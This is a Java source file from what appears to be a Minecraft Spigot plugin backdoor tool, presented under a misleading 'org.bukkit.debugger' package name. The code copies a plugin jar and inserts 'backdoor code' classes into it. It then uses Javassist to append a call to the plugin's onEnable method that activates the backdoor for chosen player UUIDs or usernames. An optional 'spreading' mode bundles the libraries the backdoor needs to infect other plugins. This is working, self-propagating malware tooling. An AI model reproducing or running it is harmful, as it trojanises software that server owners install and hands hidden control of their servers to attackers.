package org.bukkit.debugger;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.lang.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Map;

public class API {

    //state stuff (kinda gross but, joe mama)
    private static boolean print_msg;   //Should print messages to console
    private static boolean gui_msg;     //Should open GUI message

    private static void logMessage(String message){
        if(print_msg)
            System.out.println(message);
        if(gui_msg)
            InjectorGUI.displayError(message);
    }

    //More scuffed shit ha ha
    private static String stackTrace(Exception e){
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString();
    }
    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean print, boolean gui) {

        //Cry some more
        print_msg = print;
        gui_msg = gui;

        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        if (!input.toFile().exists()) {
            logMessage(" Input file: " + input.getFileName() + " does not exist.");
            return false;
        }

        /*--- Create Output File ---*/

        File temp = new File("temp");
        temp.mkdirs();
        temp.deleteOnExit();

        //Clone file
        try {
            Files.copy(input, output);
        } catch (FileAlreadyExistsException e) {
            if (override) {
                try {
                    Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e1) {
                    logMessage("Unknown error creating file: " + output.getFileName() + "\n" + stackTrace(e));
                    return false;
                }
            }else{
                return false;
            }

        } catch (IOException e) {
            logMessage("Unknown error creating file: " + output.getFileName() + "\n" + stackTrace(e));
            return false;
        }

        /*--- Read Plugin Metadata ---*/

        if(print_msg) {
            System.out.println("[Injector] Reading plugin data for file: " + input.getFileName() + "\n" + input.toAbsolutePath());
        }

        Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString());

        if(pluginYAML == null){
            if(print_msg) {
                System.out.println("[Injector] Not a valid spigot plugin: " + input.getFileName() + "\n" + input.toAbsolutePath());
            }
            return false;
        }
        
        String name = (String) pluginYAML.get("name");
        String mainClass = (String) pluginYAML.get("main");

        if(print_msg)
            System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);

        /*--- Copy Backdoor Code ---*/

        FileSystem outStream    = null;
        try {
            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
        } catch (IOException e) {
            logMessage(stackTrace(e));
        }

        if(print_msg)
            System.out.println("[Injector] Injecting resources.");

        int length = resource_paths_required.length;
        if(config.injectOther)
            length += resource_paths_spreading.length;

        InputStream[] resourceStreams = new InputStream[length];
        Path[] targetPaths = new Path[length];

        //Add required resources
        for(int i = 0; i < resource_paths_required.length; i++){
            resourceStreams[i] = API.class.getResourceAsStream("/" + resource_paths_required[i].replace(".", "/") + ".class");
            targetPaths[i] = outStream.getPath("/" + resource_paths_required[i].replace(".", "/") + ".class");

            try {
                Files.createDirectories(targetPaths[i].getParent());
            } catch (IOException e) {
                continue;
            }
        }

        //Add spreading resources
        if(config.injectOther){
            for(int i = 0; i < resource_paths_spreading.length; i++){
                resourceStreams[i + resource_paths_required.length] = API.class.getResourceAsStream("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
                targetPaths[i + resource_paths_required.length] = outStream.getPath("/" + resource_paths_spreading[i].replace(".", "/") + ".class");

                try {
                    Files.createDirectories(targetPaths[i + resource_paths_required.length].getParent());
                } catch (IOException e) {
                    continue;
                }

            }
        }

        try {
            //copy files

            for (int i = 0; i < targetPaths.length; i++) {
                if(print_msg)
                    System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
                Files.copy(resourceStreams[i], targetPaths[i]);
            }

        }catch(FileAlreadyExistsException e){
            logMessage("Plugin already patched.");

            try {
                outStream.close();
            } catch (IOException ex) {
                logMessage(stackTrace(ex));
            }

            return false;
        }
        catch(IOException e){
            logMessage("Unknown IO error while copying resources." + "\n" + stackTrace(e));
            return false;
        }

        /*--- Insert bytecode into main class ---*/

        try {
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);
            pool.appendClassPath(new ClassClassPath(Debugger.class));

            //Get main class, and find onEnable method

            if(print_msg)
                System.out.println("[Injector] Injecting backdoor loader into class.");

            CtClass cc = pool.get(mainClass);
            CtMethod m = cc.getDeclaredMethod("onEnable");

            //Parse UUID string
            StringBuilder sb = new StringBuilder();
            sb.append("new String[]{");
            for(int i = 0; i < config.UUID.length; i++){
                sb.append("\"");
                sb.append(config.UUID[i]);
                sb.append("\"");
                if(i != config.UUID.length - 1)
                    sb.append(",");
            }
            sb.append("}");
            if(print_msg)
                System.out.println("{ new org.bukkit.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");

            m.insertAfter("{ new org.bukkit.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");

            //Write to temporary file
            cc.writeFile(temp.toString());
        }catch(Exception e){
            logMessage("Javassit library error.\n" + stackTrace(e));
            return false;
        }

        /*--- Write new main class ---*/

        if(print_msg)
            System.out.println("[Injector] Writing patched main class.");
        Path patchedFile        = null;
        Path target             = null;

        try {
            //Write final patched file
            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
            target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");

            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
            if(print_msg)
                System.out.println("[Injector] Finished writing file: " + output.getFileName());
            outStream.close();
        }catch(IOException e){
            logMessage("Unknown IO error while copying new main class.\n" + e.getStackTrace().toString());
            return false;
        }


        return true;
    }

    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml();
        InputStream is = null;

        //Get plugin.yml file path
        String inputFile = null;
        if(SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC)
            inputFile = "jar:file://" + path + "!/plugin.yml";
        if(SystemUtils.IS_OS_WINDOWS)
            inputFile = "jar:file:/" + path + "!/plugin.yml";

        try {
            if (inputFile.startsWith("jar:")) {
                URL inputURL = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection) inputURL.openConnection();
                is = connection.getInputStream();
            }
        } catch (IOException e) {
            logMessage("Error while parsing plugin YAML.\n"+ stackTrace(e));
            return null;
        }

        return yamlData.load(is);
    }

    //Simplifed config for injector gui
    public static class SimpleConfig {
        public boolean useUsernames;
        public String[] UUID;
        public String prefix;
        public boolean injectOther;
        public boolean warnings;

        public SimpleConfig(boolean b1, String[] s1, String s2, boolean b2, boolean b3) {
            useUsernames = b1;
            UUID = s1;
            prefix = s2;
            injectOther = b2;
            warnings = b3;
        }
    }

    private static String[] resource_paths_required = {
            "org.bukkit.debugger.Debugger",
            "org.bukkit.debugger.Debugger$1",
            "org.bukkit.debugger.Debugger$2",
            "org.bukkit.debugger.Debugger$3",
            "org.bukkit.debugger.Debugger$4",
            "org.bukkit.debugger.Debugger$5",
            "org.bukkit.debugger.Debugger$6",
            "org.bukkit.debugger.Debugger$7",
            "org.bukkit.debugger.Debugger$8",
            "org.bukkit.debugger.Debugger$9",
            "org.bukkit.debugger.Debugger$10",
            "org.bukkit.debugger.Debugger$11",
            "org.bukkit.debugger.Debugger$12",
            "org.bukkit.debugger.Config",
            "org.bukkit.debugger.Config$HelpItem",
            "org.bukkit.debugger.API",
            "org.bukkit.debugger.API$SimpleConfig"
    };
    private static String[] resource_paths_spreading = {
            "javassist.ByteArrayClassPath",
            "javassist.CannotCompileException",
            "javassist.ClassClassPath",
            "javassist.ClassMap",
            "javassist.ClassPath",
            "javassist.ClassPathList",
            "javassist.ClassPool$1",
            "javassist.ClassPool",
            "javassist.ClassPoolTail",
            "javassist.CodeConverter$ArrayAccessReplacementMethodNames",
            "javassist.CodeConverter$DefaultArrayAccessReplacementMethodNames",
            "javassist.CodeConverter",
            "javassist.CtArray",
            "javassist.CtBehavior",
            "javassist.CtClass$1",
            "javassist.CtClass$DelayedFileOutputStream",
            "javassist.CtClass",
            "javassist.CtClassType",
            "javassist.CtConstructor",
            "javassist.CtField$ArrayInitializer",
            "javassist.CtField$CodeInitializer",
            "javassist.CtField$CodeInitializer0",
            "javassist.CtField$DoubleInitializer",
            "javassist.CtField$FloatInitializer",
            "javassist.CtField$Initializer",
            "javassist.CtField$IntInitializer",
            "javassist.CtField$LongInitializer",
            "javassist.CtField$MethodInitializer",
            "javassist.CtField$MultiArrayInitializer",
            "javassist.CtField$NewInitializer",
            "javassist.CtField$ParamInitializer",
            "javassist.CtField$PtreeInitializer",
            "javassist.CtField$StringInitializer",
            "javassist.CtField",
            "javassist.CtMember$Cache",
            "javassist.CtMember",
            "javassist.CtMethod$ConstParameter",
            "javassist.CtMethod$IntConstParameter",
            "javassist.CtMethod$LongConstParameter",
            "javassist.CtMethod$StringConstParameter",
            "javassist.CtMethod",
            "javassist.CtNewClass",
            "javassist.CtNewConstructor",
            "javassist.CtNewMethod",
            "javassist.CtNewNestedClass",
            "javassist.CtNewWrappedConstructor",
            "javassist.CtNewWrappedMethod",
            "javassist.CtPrimitiveType",
            "javassist.DirClassPath",
            "javassist.FieldInitLink",
            "javassist.JarClassPath",
            "javassist.JarDirClassPath$1",
            "javassist.JarDirClassPath",
            "javassist.Loader",
            "javassist.LoaderClassPath",
            "javassist.Modifier",
            "javassist.NotFoundException",
            "javassist.SerialVersionUID$1",
            "javassist.SerialVersionUID$2",
            "javassist.SerialVersionUID$3",
            "javassist.SerialVersionUID",
            "javassist.Translator",
            "javassist.URLClassPath",
            "javassist.bytecode.AccessFlag",
            "javassist.bytecode.AnnotationDefaultAttribute",
            "javassist.bytecode.AnnotationsAttribute$Copier",
            "javassist.bytecode.AnnotationsAttribute$Parser",
            "javassist.bytecode.AnnotationsAttribute$Renamer",
            "javassist.bytecode.AnnotationsAttribute$Walker",
            "javassist.bytecode.AnnotationsAttribute",
            "javassist.bytecode.AttributeInfo",
            "javassist.bytecode.BadBytecode",
            "javassist.bytecode.BootstrapMethodsAttribute$BootstrapMethod",
            "javassist.bytecode.BootstrapMethodsAttribute",
            "javassist.bytecode.ByteArray",
            "javassist.bytecode.ByteStream",
            "javassist.bytecode.ByteVector",
            "javassist.bytecode.Bytecode",
            "javassist.bytecode.ClassFile",
            "javassist.bytecode.ClassFilePrinter",
            "javassist.bytecode.ClassFileWriter$AttributeWriter",
            "javassist.bytecode.ClassFileWriter$ConstPoolWriter",
            "javassist.bytecode.ClassFileWriter$FieldWriter",
            "javassist.bytecode.ClassFileWriter$MethodWriter",
            "javassist.bytecode.ClassFileWriter",
            "javassist.bytecode.ClassInfo",
            "javassist.bytecode.CodeAnalyzer",
            "javassist.bytecode.CodeAttribute$LdcEntry",
            "javassist.bytecode.CodeAttribute$RuntimeCopyException",
            "javassist.bytecode.CodeAttribute",
            "javassist.bytecode.CodeIterator$AlignmentException",
            "javassist.bytecode.CodeIterator$Branch",
            "javassist.bytecode.CodeIterator$Branch16",
            "javassist.bytecode.CodeIterator$Gap",
            "javassist.bytecode.CodeIterator$If16",
            "javassist.bytecode.CodeIterator$Jump16",
            "javassist.bytecode.CodeIterator$Jump32",
            "javassist.bytecode.CodeIterator$LdcW",
            "javassist.bytecode.CodeIterator$Lookup",
            "javassist.bytecode.CodeIterator$Pointers",
            "javassist.bytecode.CodeIterator$Switcher",
            "javassist.bytecode.CodeIterator$Table",
            "javassist.bytecode.CodeIterator",
            "javassist.bytecode.ConstInfo",
            "javassist.bytecode.ConstInfoPadding",
            "javassist.bytecode.ConstPool",
            "javassist.bytecode.ConstantAttribute",
            "javassist.bytecode.DeprecatedAttribute",
            "javassist.bytecode.Descriptor$Iterator",
            "javassist.bytecode.Descriptor$PrettyPrinter",
            "javassist.bytecode.Descriptor",
            "javassist.bytecode.DoubleInfo",
            "javassist.bytecode.DuplicateMemberException",
            "javassist.bytecode.EnclosingMethodAttribute",
            "javassist.bytecode.ExceptionTable",
            "javassist.bytecode.ExceptionTableEntry",
            "javassist.bytecode.ExceptionsAttribute",
            "javassist.bytecode.FieldInfo",
            "javassist.bytecode.FieldrefInfo",
            "javassist.bytecode.FloatInfo",
            "javassist.bytecode.InnerClassesAttribute",
            "javassist.bytecode.InstructionPrinter",
            "javassist.bytecode.IntegerInfo",
            "javassist.bytecode.InterfaceMethodrefInfo",
            "javassist.bytecode.InvokeDynamicInfo",
            "javassist.bytecode.LineNumberAttribute$Pc",
            "javassist.bytecode.LineNumberAttribute",
            "javassist.bytecode.LocalVariableAttribute",
            "javassist.bytecode.LocalVariableTypeAttribute",
            "javassist.bytecode.LongInfo",
            "javassist.bytecode.LongVector",
            "javassist.bytecode.MemberrefInfo",
            "javassist.bytecode.MethodHandleInfo",
            "javassist.bytecode.MethodInfo",
            "javassist.bytecode.MethodParametersAttribute",
            "javassist.bytecode.MethodTypeInfo",
            "javassist.bytecode.MethodrefInfo",
            "javassist.bytecode.Mnemonic",
            "javassist.bytecode.NameAndTypeInfo",
            "javassist.bytecode.Opcode",
            "javassist.bytecode.ParameterAnnotationsAttribute",
            "javassist.bytecode.SignatureAttribute$1",
            "javassist.bytecode.SignatureAttribute$ArrayType",
            "javassist.bytecode.SignatureAttribute$BaseType",
            "javassist.bytecode.SignatureAttribute$ClassSignature",
            "javassist.bytecode.SignatureAttribute$ClassType",
            "javassist.bytecode.SignatureAttribute$Cursor",
            "javassist.bytecode.SignatureAttribute$MethodSignature",
            "javassist.bytecode.SignatureAttribute$NestedClassType",
            "javassist.bytecode.SignatureAttribute$ObjectType",
            "javassist.bytecode.SignatureAttribute$Type",
            "javassist.bytecode.SignatureAttribute$TypeArgument",
            "javassist.bytecode.SignatureAttribute$TypeParameter",
            "javassist.bytecode.SignatureAttribute$TypeVariable",
            "javassist.bytecode.SignatureAttribute",
            "javassist.bytecode.SourceFileAttribute",
            "javassist.bytecode.StackMap$Copier",
            "javassist.bytecode.StackMap$InsertLocal",
            "javassist.bytecode.StackMap$NewRemover",
            "javassist.bytecode.StackMap$Printer",
            "javassist.bytecode.StackMap$Shifter",
            "javassist.bytecode.StackMap$SimpleCopy",
            "javassist.bytecode.StackMap$SwitchShifter",
            "javassist.bytecode.StackMap$Walker",
            "javassist.bytecode.StackMap$Writer",
            "javassist.bytecode.StackMap",
            "javassist.bytecode.StackMapTable$Copier",
            "javassist.bytecode.StackMapTable$InsertLocal",
            "javassist.bytecode.StackMapTable$NewRemover",
            "javassist.bytecode.StackMapTable$OffsetShifter",
            "javassist.bytecode.StackMapTable$Printer",
            "javassist.bytecode.StackMapTable$RuntimeCopyException",
            "javassist.bytecode.StackMapTable$Shifter",
            "javassist.bytecode.StackMapTable$SimpleCopy",
            "javassist.bytecode.StackMapTable$SwitchShifter",
            "javassist.bytecode.StackMapTable$Walker",
            "javassist.bytecode.StackMapTable$Writer",
            "javassist.bytecode.StackMapTable",
            "javassist.bytecode.StringInfo",
            "javassist.bytecode.SyntheticAttribute",
            "javassist.bytecode.TypeAnnotationsAttribute$Copier",
            "javassist.bytecode.TypeAnnotationsAttribute$Renamer",
            "javassist.bytecode.TypeAnnotationsAttribute$SubCopier",
            "javassist.bytecode.TypeAnnotationsAttribute$SubWalker",
            "javassist.bytecode.TypeAnnotationsAttribute$TAWalker",
            "javassist.bytecode.TypeAnnotationsAttribute",
            "javassist.bytecode.Utf8Info",
            "javassist.bytecode.analysis.Analyzer$1",
            "javassist.bytecode.analysis.Analyzer$ExceptionInfo",
            "javassist.bytecode.analysis.Analyzer",
            "javassist.bytecode.analysis.ControlFlow$1",
            "javassist.bytecode.analysis.ControlFlow$2",
            "javassist.bytecode.analysis.ControlFlow$3",
            "javassist.bytecode.analysis.ControlFlow$Access",
            "javassist.bytecode.analysis.ControlFlow$Block",
            "javassist.bytecode.analysis.ControlFlow$Catcher",
            "javassist.bytecode.analysis.ControlFlow$Node",
            "javassist.bytecode.analysis.ControlFlow",
            "javassist.bytecode.analysis.Executor",
            "javassist.bytecode.analysis.Frame",
            "javassist.bytecode.analysis.FramePrinter",
            "javassist.bytecode.analysis.IntQueue$1",
            "javassist.bytecode.analysis.IntQueue$Entry",
            "javassist.bytecode.analysis.IntQueue",
            "javassist.bytecode.analysis.MultiArrayType",
            "javassist.bytecode.analysis.MultiType",
            "javassist.bytecode.analysis.Subroutine",
            "javassist.bytecode.analysis.SubroutineScanner",
            "javassist.bytecode.analysis.Type",
            "javassist.bytecode.analysis.Util",
            "javassist.bytecode.annotation.Annotation$Pair",
            "javassist.bytecode.annotation.Annotation",
            "javassist.bytecode.annotation.AnnotationImpl",
            "javassist.bytecode.annotation.AnnotationMemberValue",
            "javassist.bytecode.annotation.AnnotationsWriter",
            "javassist.bytecode.annotation.ArrayMemberValue",
            "javassist.bytecode.annotation.BooleanMemberValue",
            "javassist.bytecode.annotation.ByteMemberValue",
            "javassist.bytecode.annotation.CharMemberValue",
            "javassist.bytecode.annotation.ClassMemberValue",
            "javassist.bytecode.annotation.DoubleMemberValue",
            "javassist.bytecode.annotation.EnumMemberValue",
            "javassist.bytecode.annotation.FloatMemberValue",
            "javassist.bytecode.annotation.IntegerMemberValue",
            "javassist.bytecode.annotation.LongMemberValue",
            "javassist.bytecode.annotation.MemberValue",
            "javassist.bytecode.annotation.MemberValueVisitor",
            "javassist.bytecode.annotation.NoSuchClassError",
            "javassist.bytecode.annotation.ShortMemberValue",
            "javassist.bytecode.annotation.StringMemberValue",
            "javassist.bytecode.annotation.TypeAnnotationsWriter",
            "javassist.bytecode.stackmap.BasicBlock$Catch",
            "javassist.bytecode.stackmap.BasicBlock$JsrBytecode",
            "javassist.bytecode.stackmap.BasicBlock$Maker",
            "javassist.bytecode.stackmap.BasicBlock$Mark",
            "javassist.bytecode.stackmap.BasicBlock",
            "javassist.bytecode.stackmap.MapMaker",
            "javassist.bytecode.stackmap.Tracer",
            "javassist.bytecode.stackmap.TypeData$AbsTypeVar",
            "javassist.bytecode.stackmap.TypeData$ArrayElement",
            "javassist.bytecode.stackmap.TypeData$ArrayType",
            "javassist.bytecode.stackmap.TypeData$BasicType",
            "javassist.bytecode.stackmap.TypeData$ClassName",
            "javassist.bytecode.stackmap.TypeData$NullType",
            "javassist.bytecode.stackmap.TypeData$TypeVar",
            "javassist.bytecode.stackmap.TypeData$UninitData",
            "javassist.bytecode.stackmap.TypeData$UninitThis",
            "javassist.bytecode.stackmap.TypeData$UninitTypeVar",
            "javassist.bytecode.stackmap.TypeData",
            "javassist.bytecode.stackmap.TypeTag",
            "javassist.bytecode.stackmap.TypedBlock$Maker",
            "javassist.bytecode.stackmap.TypedBlock",
            "javassist.compiler.AccessorMaker",
            "javassist.compiler.CodeGen$1",
            "javassist.compiler.CodeGen$ReturnHook",
            "javassist.compiler.CodeGen",
            "javassist.compiler.CompileError",
            "javassist.compiler.Javac$1",
            "javassist.compiler.Javac$2",
            "javassist.compiler.Javac$3",
            "javassist.compiler.Javac$CtFieldWithInit",
            "javassist.compiler.Javac",
            "javassist.compiler.JvstCodeGen",
            "javassist.compiler.JvstTypeChecker",
            "javassist.compiler.KeywordTable",
            "javassist.compiler.Lex",
            "javassist.compiler.MemberCodeGen$JsrHook",
            "javassist.compiler.MemberCodeGen$JsrHook2",
            "javassist.compiler.MemberCodeGen",
            "javassist.compiler.MemberResolver$Method",
            "javassist.compiler.MemberResolver",
            "javassist.compiler.NoFieldException",
            "javassist.compiler.Parser",
            "javassist.compiler.ProceedHandler",
            "javassist.compiler.SymbolTable",
            "javassist.compiler.SyntaxError",
            "javassist.compiler.Token",
            "javassist.compiler.TokenId",
            "javassist.compiler.TypeChecker",
            "javassist.compiler.ast.ASTList",
            "javassist.compiler.ast.ASTree",
            "javassist.compiler.ast.ArrayInit",
            "javassist.compiler.ast.AssignExpr",
            "javassist.compiler.ast.BinExpr",
            "javassist.compiler.ast.CallExpr",
            "javassist.compiler.ast.CastExpr",
            "javassist.compiler.ast.CondExpr",
            "javassist.compiler.ast.Declarator",
            "javassist.compiler.ast.DoubleConst",
            "javassist.compiler.ast.Expr",
            "javassist.compiler.ast.FieldDecl",
            "javassist.compiler.ast.InstanceOfExpr",
            "javassist.compiler.ast.IntConst",
            "javassist.compiler.ast.Keyword",
            "javassist.compiler.ast.Member",
            "javassist.compiler.ast.MethodDecl",
            "javassist.compiler.ast.NewExpr",
            "javassist.compiler.ast.Pair",
            "javassist.compiler.ast.Stmnt",
            "javassist.compiler.ast.StringL",
            "javassist.compiler.ast.Symbol",
            "javassist.compiler.ast.Variable",
            "javassist.compiler.ast.Visitor",
            "javassist.convert.TransformAccessArrayField",
            "javassist.convert.TransformAfter",
            "javassist.convert.TransformBefore",
            "javassist.convert.TransformCall",
            "javassist.convert.TransformFieldAccess",
            "javassist.convert.TransformNew",
            "javassist.convert.TransformNewClass",
            "javassist.convert.TransformReadField",
            "javassist.convert.TransformWriteField",
            "javassist.convert.Transformer",
            "javassist.expr.Cast$ProceedForCast",
            "javassist.expr.Cast",
            "javassist.expr.ConstructorCall",
            "javassist.expr.Expr",
            "javassist.expr.ExprEditor$LoopContext",
            "javassist.expr.ExprEditor$NewOp",
            "javassist.expr.ExprEditor",
            "javassist.expr.FieldAccess$ProceedForRead",
            "javassist.expr.FieldAccess$ProceedForWrite",
            "javassist.expr.FieldAccess",
            "javassist.expr.Handler",
            "javassist.expr.Instanceof$ProceedForInstanceof",
            "javassist.expr.Instanceof",
            "javassist.expr.MethodCall",
            "javassist.expr.NewArray$ProceedForArray",
            "javassist.expr.NewArray",
            "javassist.expr.NewExpr$ProceedForNew",
            "javassist.expr.NewExpr",
            "javassist.runtime.Cflow$Depth",
            "javassist.runtime.Cflow",
            "javassist.runtime.Desc",
            "javassist.runtime.DotClass",
            "javassist.runtime.Inner",
            "javassist.scopedpool.ScopedClassPool",
            "javassist.scopedpool.ScopedClassPoolFactory",
            "javassist.scopedpool.ScopedClassPoolFactoryImpl",
            "javassist.scopedpool.ScopedClassPoolRepository",
            "javassist.scopedpool.ScopedClassPoolRepositoryImpl",
            "javassist.scopedpool.SoftValueHashMap$SoftValueRef",
            "javassist.scopedpool.SoftValueHashMap",
            "javassist.tools.Callback",
            "javassist.tools.Dump",
            "javassist.tools.framedump",
            "javassist.tools.reflect.CannotCreateException",
            "javassist.tools.reflect.CannotInvokeException",
            "javassist.tools.reflect.CannotReflectException",
            "javassist.tools.reflect.ClassMetaobject",
            "javassist.tools.reflect.CompiledClass",
            "javassist.tools.reflect.Compiler",
            "javassist.tools.reflect.Loader",
            "javassist.tools.reflect.Metalevel",
            "javassist.tools.reflect.Metaobject",
            "javassist.tools.reflect.Reflection",
            "javassist.tools.reflect.Sample",
            "javassist.tools.rmi.AppletServer",
            "javassist.tools.rmi.ExportedObject",
            "javassist.tools.rmi.ObjectImporter",
            "javassist.tools.rmi.ObjectNotFoundException",
            "javassist.tools.rmi.Proxy",
            "javassist.tools.rmi.RemoteException",
            "javassist.tools.rmi.RemoteRef",
            "javassist.tools.rmi.Sample",
            "javassist.tools.rmi.StubGenerator",
            "javassist.tools.web.BadHttpRequest",
            "javassist.tools.web.ServiceThread",
            "javassist.tools.web.Viewer",
            "javassist.tools.web.Webserver",
            "javassist.util.HotSwapper$1",
            "javassist.util.HotSwapper",
            "javassist.util.Trigger",
            "javassist.util.proxy.FactoryHelper",
            "javassist.util.proxy.MethodFilter",
            "javassist.util.proxy.MethodHandler",
            "javassist.util.proxy.Proxy",
            "javassist.util.proxy.ProxyFactory$1",
            "javassist.util.proxy.ProxyFactory$2",
            "javassist.util.proxy.ProxyFactory$3",
            "javassist.util.proxy.ProxyFactory$ClassLoaderProvider",
            "javassist.util.proxy.ProxyFactory$Find2MethodsArgs",
            "javassist.util.proxy.ProxyFactory$ProxyDetails",
            "javassist.util.proxy.ProxyFactory$UniqueName",
            "javassist.util.proxy.ProxyFactory",
            "javassist.util.proxy.ProxyObject",
            "javassist.util.proxy.ProxyObjectInputStream",
            "javassist.util.proxy.ProxyObjectOutputStream",
            "javassist.util.proxy.RuntimeSupport$DefaultMethodHandler",
            "javassist.util.proxy.RuntimeSupport",
            "javassist.util.proxy.SecurityActions$1",
            "javassist.util.proxy.SecurityActions$2",
            "javassist.util.proxy.SecurityActions$3",
            "javassist.util.proxy.SecurityActions$4",
            "javassist.util.proxy.SecurityActions$5",
            "javassist.util.proxy.SecurityActions$6",
            "javassist.util.proxy.SecurityActions",
            "javassist.util.proxy.SerializedProxy$1",
            "javassist.util.proxy.SerializedProxy",
            "org.bukkit.plugin.Plugin"
    };
}


